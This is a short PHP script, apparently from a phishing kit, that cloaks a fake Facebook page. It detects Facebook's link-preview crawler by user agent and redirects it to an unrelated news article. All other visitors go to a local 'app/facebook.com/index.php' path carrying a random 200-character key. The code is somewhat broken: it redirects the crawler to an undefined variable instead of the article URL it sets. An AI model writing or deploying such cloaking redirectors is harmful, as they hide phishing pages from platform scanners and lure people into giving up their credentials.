<?php
include "config.php";
$agent = $_SERVER['HTTP_USER_AGENT'];
$agent = trim($agent);
$agent = strtolower($agent);
if (
strpos($agent,'facebookexternalhit/1.1')===0
|| strpos($agent,'facebookexternalhit/1.0')===0
){  
$name_rank = "https://www.eluniversal.com.mx/mundo/mexico-el-pais-mas-letal-del-mundo-para-civiles";
 header("HTTP/1.1 301 Moved Permanently");
header("Location: ".$DFC.""); }else{
}
$longitud = '200';
$key = '';
$keys = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
$max = strlen($keys) - 1;
for($i=0; $i < $longitud; $i++){
$key .= $keys{mt_rand(0,$max)};
}
$navigator_user_agent = (isset($_SERVER['HTTP_USER_AGENT'])) ? strtolower($_SERVER['HTTP_USER_AGENT']):'';
header ("Location:  ". $enlace_actual."app/facebook.com/index.php?key=".$key); 
?>
